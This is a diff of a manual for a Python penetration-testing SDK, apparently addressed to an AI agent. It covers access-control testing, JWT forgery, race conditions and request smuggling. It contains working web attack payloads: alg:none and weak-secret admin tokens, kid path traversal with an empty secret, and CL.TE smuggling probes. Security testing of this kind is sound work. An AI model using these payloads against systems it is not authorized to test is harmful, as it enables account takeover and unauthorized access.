@@ -71,7 +71,7 @@ You reproduce Burp's whole workflow by composing the SDK in code:
 | Autorize (access control) | replay every request under a 2nd identity, `diff` vs baseline; `manual("authz")` |
 | Turbo Intruder / race | `redamon.batch(id, [...]*N, parallel=True)`; `manual("race")` |
 | Param Miner | brute param/header names, diff vs baseline; `manual("cache")` |
-| HTTP Request Smuggler | timing probes via crafted `mutate.headers`/`body`; `manual("smuggling")` |
+| HTTP Request Smuggler | find candidates; confirm raw via kali_shell (proxy normalises framing); `manual("smuggling")` |
 | Grep-Match / Grep-Extract | read `.body`/`.status`/`.length` per Response; that IS your oracle |
 
 The boundary is your own code — it's Python. Anything Burp automates, you script.
@@ -213,16 +213,20 @@ identity and (b) UNAUTHENTICATED, and compare to the baseline. Same data back = 
 There is no `identity()` helper — supply the alternate auth yourself in `mutate`
 (get a low-priv session cookie from a captured login response, or from the user).
 ```python
-base = {}
 for t in redamon.search(session="sess_owner"):
-    base[t.id] = redamon.get(t.id)                        # owner baseline
+    base = redamon.replay(t.id, {})                        # owner baseline (a Response — same shape as below)
+    if base.status not in (200, 201):
+        continue                                           # only test requests that actually returned data
     unauth = redamon.replay(t.id, {"dropHeaders": ["Cookie", "Authorization"]})
     low    = redamon.replay(t.id, {"cookie": "session=<low_priv_cookie>"})
     for who, r in (("unauth", unauth), ("lowpriv", low)):
-        if r.status == 200 and r.body == base[t.id].split("\n\n",2)[-1]:
+        if r.status == base.status and r.body == base.body:  # weaker identity got the SAME data
             redamon.finding("bola", t.id, evidence=r, severity="high")
-            print("LEAK", who, t.raw.split()[1] if t.raw else t.id)
+            print("LEAK", who, t.id)
 ```
+Compare Response-to-Response (`.status`/`.body`), never a Response body to `get()`'s
+FORMATTED text. Confirm a positive: the leaked body carries the OTHER user's unique
+data (name/email), not just a matching length. Cover all verbs and lifecycle states.
 Cover the whole matrix (research-backed): test **all verbs** (GET/POST/PUT/PATCH/DELETE),
 not just GET — action-level BOLA is the biggest family; test objects in **all lifecycle
 states** (active/archived/deleted); horizontal (peer user's id) AND vertical (drop to
@@ -240,16 +244,11 @@ print(j.header, j.payload)
 # 1) alg:none — server honours unsigned tokens
 none_tok = j.forge(alg_none=True, claims={"role": "admin"})
 # 2) weak secret — brute a wordlist, then mint anything
-import hmac, hashlib, base64
-def sign(h, p, secret):
-    si = redamon._b64u(__import__("json").dumps(h)) + "." + redamon._b64u(__import__("json").dumps(p))
-    return si + "." + redamon._b64u_bytes(hmac.new(secret.encode(), si.encode(), hashlib.sha256).digest())
-# (or just try common secrets via j.forge(secret=s, claims=...))
 forged = j.forge(secret="secret123", claims={"role": "admin", "sub": 1})
 # 3) RS256 -> HS256 confusion: sign an HS256 token using the server's RSA PUBLIC key as
 #    the HMAC secret (fetch the pubkey from /jwks or a cert; use it as `secret`).
-# 4) kid path traversal: forge with header kid pointing at a predictable/empty file
-#    (e.g. "../../dev/null") and sign with an empty secret: j.forge(secret="", claims=...)
+# 4) kid injection: set the header key on the object first, then sign with an empty secret:
+#    j.header["kid"] = "../../dev/null" ; ktok = j.forge(secret="", claims={"role":"admin"})
 for label, ft in [("none", none_tok), ("weak", forged)]:
     r = redamon.replay(t.id, {"headers": {"Authorization": f"Bearer {ft}"}})
     print(label, r.status, "ACCEPTED" if r.status == 200 else "rejected")
@@ -271,27 +270,24 @@ if ok > 1: redamon.finding("race-limit-overrun", t.id, severity="high")
 Keep N modest (20-50) — enough for the window, within budget. If the action needs a
 fresh token per attempt, fetch tokens first (see `manual("flows")`), then race the final step.
 
-## smuggling — request-smuggling / desync (timing probes)
+## smuggling — request-smuggling / desync (find candidates, confirm elsewhere)
 
-You can't set raw malformed framing through the normal builder, but you can send
-conflicting length headers via `mutate.headers` + `mutate.body` and read the TIMING: a
-vulnerable back-end HANGS waiting for bytes the front-end already ended.
+IMPORTANT: `redamon.replay` CANNOT detect smuggling. A desync needs raw, ambiguous
+Content-Length vs Transfer-Encoding framing, and BOTH curl and the capture proxy
+NORMALISE the request before it reaches the target's front-end — the ambiguity is
+resolved away, so a timing probe through the replay path proves nothing. What you can
+do here is FIND candidates and hand off confirmation to a raw tool:
 ```python
-import time
-t = redamon.search(method="POST")[0]
-def timed(mut):
-    s = time.time(); r = redamon.replay(t.id, mut); return time.time() - s, r.status
-base_dt, _ = timed({})                                     # normal baseline (fast)
-# CL.TE probe: front-end uses Content-Length, back-end uses Transfer-Encoding
-probe_dt, _ = timed({"headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"},
-                     "body": "0\r\n\r\nX"})
-ctrl_dt, _  = timed({"headers": {"Transfer-Encoding": "chunked"}, "body": "0\r\n\r\n"})  # self-consistent = fast
-print(f"base={base_dt:.2f} probe={probe_dt:.2f} ctrl={ctrl_dt:.2f}")
-if probe_dt > base_dt + 3 and ctrl_dt < base_dt + 1:
-    redamon.finding("http-desync-clte", t.id, severity="high")
+# 1) Candidates live at hop boundaries — endpoints fronted by a proxy/cache/LB.
+for t in redamon.search(method="POST"):
+    resp = redamon.get(t.id, "response").lower()
+    if any(k in resp for k in ("via", "x-cache", "cf-ray", "x-served-by", "x-forwarded")):
+        print("smuggling candidate (fronted):", t.id, "->", redamon.to_curl(t.id).splitlines()[-1])
 ```
-A big probe delay with a fast control = likely CL.TE. Swap the header roles for TE.CL.
-Front-ends that downgrade HTTP/2->HTTP/1.1 re-expose these.
+2) CONFIRM with a tool that preserves byte framing, run via `kali_shell` (NOT redamon):
+   a raw-socket Python script or `smuggler`, sending CL.TE / TE.CL probes directly. A
+   vulnerable back-end HANGS ~10s waiting for bytes the front-end already ended.
+   HTTP/2 front-ends that downgrade to HTTP/1.1 re-expose these.
 
 ## cache — web cache poisoning & hidden inputs (Param Miner, in code)
 
